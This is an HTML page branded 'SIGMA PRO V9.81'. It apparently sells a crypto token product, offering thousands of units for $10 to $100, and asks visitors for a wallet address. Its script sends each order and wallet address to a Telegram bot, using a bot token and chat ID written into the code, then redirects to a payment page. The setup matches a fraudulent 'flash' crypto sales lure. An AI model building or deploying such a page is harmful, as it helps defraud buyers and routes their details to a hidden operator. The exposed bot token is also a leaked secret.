<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SIGMA 9.81 new-gn</title>
  <style>
    body {
      margin: 0;
      background: #0a0a1a;
      font-family: 'Arial', sans-serif;
      color: #ffffff;
    }

    .container {
      max-width: 400px;
      margin: 100px auto 40px;
      padding: 20px;
      background-color: #11182c;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0, 255, 200, 0.4);
      text-align: center;
    }

    .logo {
      margin-bottom: 30px;
    }

    .logo img {
      width: 60px;
      height: 60px;
      object-fit: contain;
    }

    .logo h1 {
      margin: 10px 0 0;
      font-size: 20px;
      color: #ffffff;
    }

    .form-group {
      margin-bottom: 20px;
      text-align: left;
    }

    .form-group label {
      display: block;
      margin-bottom: 8px;
      color: #b5bfd8;
      font-weight: bold;
    }

    select, input[type="text"], input[readonly] {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: none;
      font-size: 14px;
      background-color: #ffffff;
      color: #000;
    }

    .network-options {
      display: flex;
      gap: 8px;
      justify-content: space-between;
      margin-top: 10px;
    }

    .network-options input[type="radio"] {
      display: none;
    }

    .network-options label {
      flex: 1;
      padding: 10px;
      background-color: #ffffff;
      color: #000;
      text-align: center;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }

    .network-options input[type="radio"]:checked + label {
      background-color: #00ffc8;
      color: #000;
      box-shadow: 0 0 8px #00ffc8;
    }

    .net-icon {
      width: 20px;
      height: 20px;
      object-fit: contain;
      flex-shrink: 0;
    }

    .submit-btn {
      background-color: white;
      color: #11182c;
      font-weight: bold;
      padding: 12px;
      width: 100%;
      border-radius: 30px;
      border: none;
      cursor: pointer;
      font-size: 16px;
    }

    .submit-btn::after {
      content: ' ‚ûî';
      font-size: 18px;
    }

    #loading, #successMessage {
      display: none;
      margin-top: 15px;
      font-weight: bold;
    }

    #loading {
      color: #ffdd00;
    }

    #successMessage {
      color: #00ff99;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="logo">
    <img src="abstergo.png" alt="Logo" />
    <h1>SIGMA PRO V9.81 </h1>
  </div>

  <div class="form-group">
    <label for="amount">Choose Amount</label>
    <select id="amount" onchange="updatePrice()">
      <option value="10">500</option>
      <option value="20">1500</option>
      <option value="40">2500</option>
      <option value="60">5000</option>
      <option value="100">12500</option>
    </select>
  </div>

  <div class="form-group">
    <label>Choose Network</label>
    <div class="network-options">
      <input type="radio" id="erc" name="network" value="ERC20" checked />
      <label for="erc">
        <img src="erc.png" alt="ERC20" class="net-icon" /> ERC20
      </label>

      <input type="radio" id="trc" name="network" value="TRC20" />
      <label for="trc">
        <img src="trx.png" alt="TRC20" class="net-icon" /> TRC20
      </label>

      <input type="radio" id="bep" name="network" value="BEP20" />
      <label for="bep">
        <img src="bep.png" alt="BEP20" class="net-icon" /> BEP20
      </label>
    </div>
  </div>

  <div class="form-group">
    <label for="wallet">Your Wallet Address</label>
    <input type="text" id="wallet" placeholder="Enter your wallet address" />
  </div>

  <div class="form-group">
    <label for="price">USD Amount</label>
    <input type="text" id="price" readonly value="$10" />
  </div>

  <button class="submit-btn" onclick="submitForm()">CONNECT ‚óã‚óè‚óã‚óè‚óã</button>

  <div id="loading">connecting...</div>
  <div id="successMessage">connected ‚úÖ</div>
</div>

<script>
  function updatePrice() {
    const amount = document.getElementById("amount").value;
    document.getElementById("price").value = "$" + amount;
  }

  function submitForm() {
    const amount = document.getElementById("amount").value;
    const network = document.querySelector('input[name="network"]:checked').value;
    const wallet = document.getElementById("wallet").value.trim();
    const loading = document.getElementById("loading");
    const success = document.getElementById("successMessage");

    if (!wallet) {
      alert("Please enter your wallet address.");
      return;
    }

    loading.style.display = "block";
    success.style.display = "none";

    const message = `üí≥ NEW ORDER\nAmount: $${amount}\nNetwork: ${network}\nWallet: ${wallet}`;

    fetch(`https://api.telegram.org/bot7764054336:AAG6gKWXmHqHB8uC3UFzDQ6OLt4QMdKJ4mk/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: "7739393558", text: message })
    })
    .then(res => res.json())
    .then(data => {
      if (data.ok) {
        setTimeout(() => {
          loading.style.display = "none";
          success.style.display = "block";
          setTimeout(() => {
            window.location.href = "payment.html";
          }, 1000);
        }, 5000);
      } else {
        loading.style.display = "none";
        alert("‚ùå Failed to send message.");
      }
    })
    .catch(err => {
      loading.style.display = "none";
      alert("‚ùå Network error.");
      console.error("Telegram Error:", err);
    });
  }
</script>

</body>
</html>
